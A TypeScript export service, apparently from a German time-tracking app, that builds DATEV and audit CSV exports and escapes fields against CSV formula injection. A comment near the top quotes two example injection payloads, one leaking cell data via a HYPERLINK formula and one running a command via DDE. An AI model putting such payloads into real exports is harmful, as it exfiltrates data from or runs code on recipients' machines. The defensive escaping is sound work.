/**
 * Export Service - Data Export for Tax Authorities, DATEV, Audits
 *
 * Features:
 * - DATEV CSV Export (Steuerberater-Format, Semicolon-separated)
 * - Historical Data Export (alle Jahre, für Finanzamt/Betriebsprüfung)
 * - GoBD-compliant (Grundsätze ordnungsmäßiger Buchführung)
 * - Zeitraum-Filter (von-bis)
 *
 * Standards:
 * - DATEV Format 3.0 (CSV, Semicolon, UTF-8 with BOM)
 * - GDPdU-konform (Grundsätze zum Datenzugriff und zur Prüfbarkeit digitaler Unterlagen)
 */

import db from '../database/connection.js';
import type { User, TimeEntry, AbsenceRequest } from '../types/index.js';
import logger from '../utils/logger.js';
import { format } from 'date-fns';
import { getDailyTargetHours, MissingWorkPeriodError } from '../utils/workingDays.js';
import { getUserByIdIncludingDeleted } from './userService.js';
import { formatDate, getCurrentDate } from '../utils/timezone.js';
import { createWorkPeriodContext } from './workPeriodContext.js';

/**
 * Gefährliche Anfangszeichen einer Formelinjektion (CSV Injection). Ein Feld, das mit
 * `=`, `+`, `-`, `@`, Tabulator oder Wagenrücklauf beginnt, wertet Excel/LibreOffice beim
 * Öffnen als FORMEL aus — `=HYPERLINK("http://…"&A1,"ok")` oder `=cmd|'/c calc'!A1` führt
 * beim Empfänger (Steuerberater, Betriebsprüfung) Code aus bzw. schleust Daten ab. Auslösen
 * kann das jeder Mitarbeitende mit Zeiterfassungsrecht über eine Bemerkung.
 */
const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * Eine reine Zahl in deutscher oder englischer Schreibweise, mit optionalem Minus. Diese
 * Felder dürfen NICHT mit einem Apostroph entwertet werden: Der Export trägt echte negative
 * Werte (Überstunden `-3,50`), und ein vorangestelltes `'` würde sie für DATEV zu Text
 * machen — die Maßnahme gegen die Injektion würde damit den Export beschädigen.
 */
const CSV_PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

/**
 * CR-05: Die EINE Maskierfunktion für jedes CSV-Feld dieses Moduls.
 *
 * Vorher entstanden alle Zeilen durch reines `join(';')` über ungeprüfte Freitextfelder
 * (`notes`, `reason`, `activity`, `location`, `firstName`/`lastName`). Zwei Folgen:
 *
 * 1. STRUKTURBRUCH: Ein Semikolon oder ein Zeilenumbruch in einer Bemerkung verschob alle
 *    folgenden Spalten bzw. erzeugte eine zusätzliche Datenzeile. Für einen Export an
 *    Steuerberater und Betriebsprüfung (GoBD) ist eine still verschobene Spalte kein
 *    Schönheitsfehler.
 * 2. FORMELINJEKTION: siehe `CSV_FORMULA_PREFIX`.
 *
 * Reihenfolge: erst entwerten, dann quoten — das Apostroph steht dadurch INNERHALB der
 * Anführungszeichen und bleibt beim Einlesen erhalten.
 */
function csvField(value: unknown): string {
  let s = value === null || value === undefined ? '' : String(value);

  if (CSV_FORMULA_PREFIX.test(s) && !CSV_PLAIN_NUMBER.test(s)) {
    s = `'${s}`;
  }

  if (/[";\n\r]/.test(s)) {
    s = `"${s.replace(/"/g, '""')}"`;
  }

  return s;
}

/**
 * CR-03 (Code-Review Phase 11, Durchlauf 2): Der Export bricht ab, wenn er nicht
 * vollständig sein kann — mit der VOLLSTÄNDIGEN Liste der betroffenen Nutzer.
 *
 * WARUM Abbruch und nicht "Datei mit Warnblock ausliefern": Empfänger dieser Datei sind
 * laut Kopfkommentar Steuerberater und Betriebsprüfung (GoBD). Eine CSV, die vollständig
 * aussieht, aber die Zeiteinträge und Abwesenheiten eines Mitarbeiters lautlos weglässt,
 * ist ein prüfungsrelevantes Dokument mit unbemerkter Lücke — schlimmer als ein
 * ausgebliebener Export. Ein Warnblock am Dateiende hilft nicht zuverlässig: DATEV-
 * Importwege lesen die Zeilen maschinell, ein Kommentarblock wird überlesen oder als
 * Datensatz missdeutet.
 *
 * WARUM trotzdem nicht zurück zum Vorzustand (500 beim ERSTEN defekten Nutzer): Die
 * WR-03-Vereinzelung aus Durchlauf 1 bleibt erhalten — die Schleife läuft vollständig
 * durch und SAMMELT alle Datendefekte. Der Bediener bekommt damit in einem Durchgang die
 * Liste aller zu korrigierenden Nutzer statt einen nach dem anderen. Nur das stille
 * `continue` am Ende ist durch diesen Abbruch ersetzt.
 *
 * `skippedUserIds` trägt die Nutzer-IDs, damit die Route sie in die 409-Antwort
 * übernehmen kann.
 */
export class IncompleteExportError extends Error {
  constructor(
    public readonly skippedUserIds: number[],
    message: string
  ) {
    super(message);
    this.name = 'IncompleteExportError';
  }
}

/**
 * DATEV CSV Export
 * Format: Semicolon-separated, UTF-8 with BOM
 *
 * Columns:
 * - Personalnummer (User ID)
 * - Name
 * - Datum
 * - Sollstunden
 * - Iststunden
 * - Überstunden
 * - Abwesenheitsart (Urlaub, Krank, etc.)
 * - Bemerkung
 */
export function generateDATEVExport(startDate: string, endDate: string): string {
  try {
    logger.info({ startDate, endDate }, '📊 Generating DATEV export');

    // Header
    const header = [
      'Personalnummer',
      'Name',
      'Vorname',
      'Datum',
      'Sollstunden',
      'Iststunden',
      'Überstunden',
      'Pause (Min)',
      'Abwesenheitsart',
      'Beginn',
      'Ende',
      'Bemerkung'
    ];

    const rows: string[] = [];

    // Get all users (including deleted for historical accuracy)
    const users = db.prepare(`
      SELECT id, username, firstName, lastName, weeklyHours, deletedAt
      FROM users
      ORDER BY lastName, firstName
    `).all() as User[];

    logger.debug({ userCount: users.length }, 'Users loaded');

    // Ein Kontext für den gesamten Export (D1/D2, T-11-26): schleift über viele Zeiteinträge
    // mehrerer Nutzer, jede Nutzer-Periodenliste wird trotzdem nur einmal geladen.
    const periods = createWorkPeriodContext();

    // CR-03: Nutzer, deren Zeilen wegen eines Datendefekts (D4) nicht berechnet werden
    // konnten. Wird nach der Schleife ausgewertet — siehe `IncompleteExportError`.
    const skippedUserIds: number[] = [];

    for (const user of users) {
      // WR-11: `getUserByIdIncludingDeleted()` statt `getUserById()`.
      //
      // Die Abfrage oben wählt ausdrücklich OHNE `deletedAt`-Filter aus ("including
      // deleted for historical accuracy"); `getUserById()` filtert soft-gelöschte Nutzer
      // dagegen weg (`WHERE id = ? AND deletedAt IS NULL`). Jeder soft-gelöschte Nutzer
      // wurde deshalb mit einer Warnung übersprungen — seine Zeiteinträge und
      // Abwesenheiten fehlten im DATEV-Export, obwohl die Datei vollständig aussah.
      const fullUser = getUserByIdIncludingDeleted(user.id);
      if (!fullUser) {
        logger.warn({ userId: user.id }, '⚠️ User not found, skipping');
        continue;
      }

      // Get time entries for this user in date range
      const timeEntries = db.prepare(`
        SELECT * FROM time_entries
        WHERE userId = ?
          AND date >= date(?)
          AND date <= date(?)
        ORDER BY date
      `).all(user.id, startDate, endDate) as TimeEntry[];

      // Get absence requests
      const absences = db.prepare(`
        SELECT * FROM absence_requests
        WHERE userId = ?
          AND status = 'approved'
          AND startDate <= date(?)
          AND endDate >= date(?)
        ORDER BY startDate
      `).all(user.id, endDate, startDate) as AbsenceRequest[];

      // WR-03: Vereinzelung — ein Nutzer ohne Arbeitszeitperiode (Datendefekt, D4) darf
      // den Export ALLER anderen nicht töten. Vorher lief `getDailyTargetHours()` hier
      // ungeschützt; ein einziger defekter Nutzer beendete den gesamten DATEV-Export mit
      // einem 500er. Der Defekt wird laut protokolliert, der Nutzer übersprungen; jeder
      // andere Fehler fliegt unverändert weiter.
      // Zeilen erst sammeln, dann anhängen: Wirft die Berechnung mitten im Nutzer, bleiben
      // keine halben Nutzerdaten in der Ausgabedatei stehen (alles-oder-nichts je Nutzer).
      const userRows: string[] = [];
      try {
        // Add time entries
        for (const entry of timeEntries) {
          // CRITICAL: Use getDailyTargetHours() to respect individual work schedules
          // For part-time employees with unequal distribution (Mo 8h, Fr 2h), this gives correct daily target
          const dailyTargetHours = getDailyTargetHours(fullUser, entry.date, periods);
          const overtime = entry.hours - dailyTargetHours;

          userRows.push([
            user.id.toString(),
            user.lastName,
            user.firstName,
            format(new Date(entry.date), 'dd.MM.yyyy'),
            dailyTargetHours.toFixed(2).replace('.', ','),
            entry.hours.toFixed(2).replace('.', ','),
            overtime.toFixed(2).replace('.', ','),
            entry.breakMinutes?.toString() || '0',
            '', // No absence
            entry.startTime || '',
            entry.endTime || '',
            entry.notes || ''
          ].map(csvField).join(';'));
        }

        // Add absences
        for (const absence of absences) {
          const absenceType = absence.type === 'vacation' ? 'Urlaub'
            : absence.type === 'sick' ? 'Krank'
            : absence.type === 'overtime_comp' ? 'Überstundenausgleich'
            : 'Unbezahlt';

          userRows.push([
            user.id.toString(),
            user.lastName,
            user.firstName,
            format(new Date(absence.startDate), 'dd.MM.yyyy') + ' - ' + format(new Date(absence.endDate), 'dd.MM.yyyy'),
            '0,00',
            '0,00',
            '0,00',
            '0',
            absenceType,
            '',
            '',
            absence.reason || ''
          ].map(csvField).join(';'));
        }

        rows.push(...userRows);
      } catch (err) {
        if (err instanceof MissingWorkPeriodError) {
          // CR-03: Hier stand ein reines `continue`. Der Nutzer fiel damit lautlos aus
          // einer Datei heraus, die anschließend mit HTTP 200 als vollständiger
          // GoBD-Export ausgeliefert wurde. Jetzt wird der Defekt vermerkt, die Schleife
          // läuft weiter (um ALLE betroffenen Nutzer zu finden), und nach der Schleife
          // bricht der Export ab. Begründung der Entscheidung "Abbruch statt Warnblock"
          // vollständig bei `IncompleteExportError`.
          logger.error(
            { userId: user.id, err },
            'Datendefekt: Nutzer ohne Arbeitszeitperiode — DATEV-Export kann nicht vollständig erzeugt werden (D4, CR-03)'
          );
          skippedUserIds.push(user.id);
          continue;
        }
        throw err;
      }
    }

    // CR-03: Kein halbes GoBD-Dokument. Die Prüfung steht NACH der Schleife, damit die
    // Fehlermeldung alle betroffenen Nutzer nennt und nicht nur den ersten.
    if (skippedUserIds.length > 0) {
      throw new IncompleteExportError(
        skippedUserIds,
        `DATEV-Export abgebrochen: ${skippedUserIds.length} Nutzer haben keine lückenlose ` +
          `Arbeitszeitperiode (Datendefekt D4) — Nutzer-IDs: ${skippedUserIds.join(', ')}. ` +
          'Eine Datei ohne deren Zeiteinträge und Abwesenheiten würde vollständig aussehen, ' +
          'wäre es aber nicht. Perioden prüfen mit `npm run check:period-chains`, danach ' +
          'den Export wiederholen.'
      );
    }

    // Create CSV with UTF-8 BOM (for Excel/DATEV compatibility)
    const csv = '\uFEFF' + header.map(csvField).join(';') + '\n' + rows.join('\n');

    logger.info({ rowCount: rows.length }, '✅ DATEV export generated');

    return csv;
  } catch (error) {
    logger.error({ err: error, startDate, endDate }, '❌ Error generating DATEV export');
    throw error;
  }
}

/**
 * Historical Data Export (alle Daten eines Users/Zeitraums)
 * For: Finanzamt, Betriebsprüfung, legal compliance
 *
 * Returns: Complete JSON with all time entries, absences, overtime, vacation
 */
export interface HistoricalExportData {
  metadata: {
    exportDate: string;
    startDate: string;
    endDate: string;
    userId?: number;
    userName?: string;
    retentionPeriod: string;
  };
  users: Array<{
    id: number;
    username: string;
    firstName: string;
    lastName: string;
    email: string;
    role: string;
    department: string | null;
    weeklyHours: number;
    vacationDaysPerYear: number;
    hireDate: string | null;
    endDate: string | null;
    status: string;
    deletedAt: string | null;
  }>;
  timeEntries: TimeEntry[];
  absences: AbsenceRequest[];
  overtimeBalance: Array<{
    userId: number;
    month: string;
    targetHours: number;
    actualHours: number;
    overtime: number;
  }>;
  vacationBalance: Array<{
    userId: number;
    year: number;
    entitlement: number;
    carryover: number;
    taken: number;
    remaining: number;
  }>;
  statistics: {
    totalUsers: number;
    totalTimeEntries: number;
    totalAbsences: number;
    totalWorkingHours: number;
    totalOvertime: number;
  };
}

export function generateHistoricalExport(
  startDate: string,
  endDate: string,
  userId?: number
): HistoricalExportData {
  try {
    logger.info({ startDate, endDate, userId }, '📊 Generating historical export');

    // Get users (all or specific)
    //
    // 14.1 / BL-03: Beide Varianten filtern stillgelegte (soft-geloeschte) Konten heraus.
    //
    // Das weicht BEWUSST von der DATEV-Schwesterfunktion derselben Datei ab, die soft-
    // geloeschte Nutzer ausdruecklich MITNIMMT (Kommentar dort: fuer die historische
    // Nachweispflicht; WR-11 aus Phase 11). Der Grund fuer den Unterschied liegt im Zweck:
    // Der DATEV-Export beliefert eine Lohnbuchhaltung, die auch fuer ausgeschiedene
    // Mitarbeiter vollstaendig sein muss. Der Historien-Export ist ein allgemeiner
    // Datenexport, der das System verlaesst; das Erfolgskriterium der Phase 14.1 verlangt
    // ausdruecklich, dass er keine stillgelegten Konten mehr enthaelt (im Bestand betroffen
    // waren die Konten 15, 26, 28, 30, 31).
    //
    // Die beiden Funktionen entscheiden also verschieden, und beide Entscheidungen stehen
    // jetzt begruendet im Quelltext. Keine der beiden Stellen wird an die andere angeglichen.
    let users: User[];
    if (userId) {
      const user = db.prepare('SELECT * FROM users WHERE id = ? AND deletedAt IS NULL').get(userId) as User | undefined;
      users = user ? [user] : [];
    } else {
      users = db.prepare('SELECT * FROM users WHERE deletedAt IS NULL ORDER BY lastName, firstName').all() as User[];
    }

    // Get time entries
    const timeEntriesQuery = userId
      ? 'SELECT * FROM time_entries WHERE userId = ? AND date >= date(?) AND date <= date(?) ORDER BY date'
      : 'SELECT * FROM time_entries WHERE date >= date(?) AND date <= date(?) ORDER BY date';

    const timeEntries = userId
      ? db.prepare(timeEntriesQuery).all(userId, startDate, endDate) as TimeEntry[]
      : db.prepare(timeEntriesQuery).all(startDate, endDate) as TimeEntry[];

    // Get absences
    //
    // 14.1 / BL-03: Beide Varianten nehmen nur genehmigte Antraege auf — woertlich nach der
    // Vorlage der DATEV-Schwesterfunktion weiter oben in dieser Datei. Ohne diese Bedingung
    // war ein abgelehnter Urlaub im Export von einem genehmigten nicht zu unterscheiden; im
    // Bestand betraf das 15 abgelehnte Antraege, darunter Krankmeldungen. Der Filter ist ein
    // Literal in der Abfrage, kein neuer Parameter — die Bindungspositionen bleiben
    // unveraendert, alle Werte bleiben ueber Platzhalter gebunden.
    const absencesQuery = userId
      ? "SELECT * FROM absence_requests WHERE userId = ? AND status = 'approved' AND startDate <= date(?) AND endDate >= date(?) ORDER BY startDate"
      : "SELECT * FROM absence_requests WHERE status = 'approved' AND startDate <= date(?) AND endDate >= date(?) ORDER BY startDate";

    const absences = userId
      ? db.prepare(absencesQuery).all(userId, endDate, startDate) as AbsenceRequest[]
      : db.prepare(absencesQuery).all(endDate, startDate) as AbsenceRequest[];

    // Get overtime balance
    //
    // 14.1 / BL-03: Zwei Einschraenkungen, die hier gefehlt haben und ueber die Kennzahl
    // `totalOvertime` weiter unten in die Statistik durchgeschlagen sind.
    //
    // 1. Nutzerfilter AUCH in der Sammelvariante. Ohne ihn summierte die Kennzahl die
    //    Monatszeilen genau jener stillgelegten Konten mit, die oben gerade herausgefiltert
    //    wurden — der Export wies also 15 Nutzer aus und rechnete mit 20. Die Ids kommen als
    //    `?`-Platzhalter in die Abfrage, nach demselben Muster wie `yearPlaceholders` weiter
    //    unten (WR-10 aus Phase 11); es wird nichts in die Abfrage hineinformatiert.
    // 2. Monatsdeckel auf den laufenden Monat. `endDate` darf in der Zukunft liegen, und ein
    //    kuenftiger Monat traegt Sollstunden ohne Iststunden — er zieht die Kennzahl um das
    //    volle Restsoll nach unten. Dieselbe Deckelung fuehrt `getOvertimeBalance()` in
    //    `overtimeTransactionService.ts` aus demselben Grund aus; der Vergleichsmonat kommt
    //    wie dort aus `formatDate(getCurrentDate(), 'yyyy-MM')` (Europe/Berlin), nicht aus
    //    SQLites `'now'` (UTC) und nicht aus einer UTC-Zeichenkette des Datumsobjekts — die
    //    Projektregel verbietet diesen Weg, weil er am Monatsersten den Vormonat liefert.
    //
    // Abgrenzung: Dieser Monatsdeckel gehoert laut D-03 zu BL-03. Er ist NICHT WR-01 — die
    // dort benannten Stellen in `workTimeAccountService.ts` und
    // `overtimeTransactionRebuildService.ts` bleiben unberuehrt.
    const startMonth = startDate.substring(0, 7);
    const currentMonth = formatDate(getCurrentDate(), 'yyyy-MM');
    const requestedEndMonth = endDate.substring(0, 7);
    const endMonth = requestedEndMonth > currentMonth ? currentMonth : requestedEndMonth;

    const exportedUserIds = users.map(u => u.id);
    const userIdPlaceholders = exportedUserIds.map(() => '?').join(',');

    const overtimeQuery = `
      SELECT * FROM overtime_balance
      WHERE userId IN (${userIdPlaceholders})
        AND month >= ?
        AND month <= ?
      ORDER BY month
    `;

    // Ohne exportierte Nutzer gibt es nichts zu summieren — und `userId IN ()` waere ein
    // SQL-Syntaxfehler. Das ist kein theoretischer Fall: Wird der Export fuer genau einen
    // Nutzer angefordert, dessen Konto stillgelegt ist, ist die Liste seit dieser Aenderung
    // leer.
    //
    // WR-09: Ergebnistyp benannt statt später per `as any[]` durchgereicht — die
    // Zieltypen stehen bereits in HistoricalExportData.
    const overtimeBalance = (exportedUserIds.length === 0
      ? []
      : db.prepare(overtimeQuery).all(...exportedUserIds, startMonth, endMonth)) as HistoricalExportData['overtimeBalance'];

    // Get vacation balance
    //
    // WR-10: Jahreszahlen als PLATZHALTER statt in die Abfrage hineingeschrieben.
    //
    // Die Werte stammen aus `parseInt()` und waren deshalb nicht injizierbar — die
    // Projektregel "Prepared Statements (PFLICHT!)" war trotzdem verletzt, und zwei echte
    // Laufzeitfehler blieben: Bei vertauschten Parametern (`endYear < startYear`) ist
    // `length` negativ, `years` leer und die Abfrage lautet `year IN ()` — SQL-Syntaxfehler.
    // Bei einem unparsbaren Datum wird `parseInt()` zu `NaN` und die Abfrage lautet
    // `year IN (NaN)` — ebenfalls Fehler. Beides endete als 500er ohne verwertbare Meldung.
    // Jetzt: Eingaben zuerst prüfen, dann `?`-Platzhalter binden.
    const startYear = parseInt(startDate.substring(0, 4), 10);
    const endYear = parseInt(endDate.substring(0, 4), 10);

    if (!Number.isInteger(startYear) || !Number.isInteger(endYear) || endYear < startYear) {
      throw new Error(
        `Ungültiger Zeitraum für den Historien-Export: ${startDate} bis ${endDate} ` +
        `(gelesene Jahre: ${startYear} bis ${endYear}).`
      );
    }

    const years = Array.from({ length: endYear - startYear + 1 }, (_, i) => startYear + i);
    const yearPlaceholders = years.map(() => '?').join(',');

    const vacationBalanceQuery = userId
      ? `SELECT * FROM vacation_balance WHERE userId = ? AND year IN (${yearPlaceholders}) ORDER BY year`
      : `SELECT * FROM vacation_balance WHERE year IN (${yearPlaceholders}) ORDER BY year`;

    const vacationBalance = (userId
      ? db.prepare(vacationBalanceQuery).all(userId, ...years)
      : db.prepare(vacationBalanceQuery).all(...years)) as HistoricalExportData['vacationBalance'];

    // Calculate statistics
    const totalWorkingHours = timeEntries.reduce((sum, entry) => sum + entry.hours, 0);
    // 14.1 / BL-03: Der Ausdruck selbst bleibt unveraendert. Er summiert jetzt eine Liste,
    // die bereits auf die exportierten Nutzer und auf Monate bis einschliesslich des
    // laufenden begrenzt ist (siehe `overtimeQuery` oben) — dort, und nicht hier, lag der
    // Fehler.
    const totalOvertime = overtimeBalance.reduce((sum, entry) => sum + entry.overtime, 0);

    const data: HistoricalExportData = {
      metadata: {
        exportDate: new Date().toISOString(),
        startDate,
        endDate,
        userId,
        userName: users[0] ? `${users[0].firstName} ${users[0].lastName}` : undefined,
        retentionPeriod: 'According to ArbZG (2 years), Tax Law (6 years)',
      },
      users: users.map(u => ({
        id: u.id,
        username: u.username,
        firstName: u.firstName,
        lastName: u.lastName,
        email: u.email,
        role: u.role,
        department: u.department,
        weeklyHours: u.weeklyHours,
        vacationDaysPerYear: u.vacationDaysPerYear,
        hireDate: u.hireDate,
        endDate: u.endDate,
        status: u.status,
        deletedAt: u.deletedAt,
      })),
      timeEntries,
      absences,
      overtimeBalance,
      vacationBalance,
      statistics: {
        totalUsers: users.length,
        totalTimeEntries: timeEntries.length,
        totalAbsences: absences.length,
        totalWorkingHours,
        totalOvertime,
      },
    };

    logger.info({
      userCount: users.length,
      timeEntriesCount: timeEntries.length,
      absencesCount: absences.length
    }, '✅ Historical export generated');

    return data;
  } catch (error) {
    logger.error({ err: error, startDate, endDate, userId }, '❌ Error generating historical export');
    throw error;
  }
}

/**
 * Generate CSV from historical export data
 */
export function historicalExportToCSV(data: HistoricalExportData): string {
  try {
    const lines: string[] = [];

    // Metadata
    lines.push('EXPORT METADATA');
    lines.push(['Export Date', data.metadata.exportDate].map(csvField).join(';'));
    lines.push(['Start Date', data.metadata.startDate].map(csvField).join(';'));
    lines.push(['End Date', data.metadata.endDate].map(csvField).join(';'));
    lines.push(['Retention Period', data.metadata.retentionPeriod].map(csvField).join(';'));
    lines.push('');

    // Users
    lines.push('USERS');
    lines.push('ID;Username;First Name;Last Name;Email;Role;Department;Weekly Hours;Vacation Days;Hire Date;End Date;Status;Deleted At');
    for (const user of data.users) {
      lines.push([
        user.id,
        user.username,
        user.firstName,
        user.lastName,
        user.email,
        user.role,
        user.department || '',
        user.weeklyHours,
        user.vacationDaysPerYear,
        user.hireDate || '',
        user.endDate || '',
        user.status,
        user.deletedAt || ''
      ].map(csvField).join(';'));
    }
    lines.push('');

    // Time Entries
    lines.push('TIME ENTRIES');
    lines.push('ID;User ID;Date;Start Time;End Time;Break (Min);Hours;Activity;Location;Notes');
    for (const entry of data.timeEntries) {
      lines.push([
        entry.id,
        entry.userId,
        entry.date,
        entry.startTime || '',
        entry.endTime || '',
        entry.breakMinutes || 0,
        entry.hours,
        entry.activity || '',
        entry.location,
        entry.notes || ''
      ].map(csvField).join(';'));
    }
    lines.push('');

    // Absences
    lines.push('ABSENCES');
    lines.push('ID;User ID;Type;Start Date;End Date;Days;Status;Reason');
    for (const absence of data.absences) {
      lines.push([
        absence.id,
        absence.userId,
        absence.type,
        absence.startDate,
        absence.endDate,
        absence.days,
        absence.status,
        absence.reason || ''
      ].map(csvField).join(';'));
    }
    lines.push('');

    // Statistics
    lines.push('STATISTICS');
    lines.push(['Total Users', data.statistics.totalUsers].map(csvField).join(';'));
    lines.push(['Total Time Entries', data.statistics.totalTimeEntries].map(csvField).join(';'));
    lines.push(['Total Absences', data.statistics.totalAbsences].map(csvField).join(';'));
    lines.push(['Total Working Hours', data.statistics.totalWorkingHours.toFixed(2)].map(csvField).join(';'));
    lines.push(['Total Overtime', data.statistics.totalOvertime.toFixed(2)].map(csvField).join(';'));

    return '\uFEFF' + lines.join('\n');
  } catch (error) {
    logger.error({ err: error }, '❌ Error converting historical export to CSV');
    throw error;
  }
}
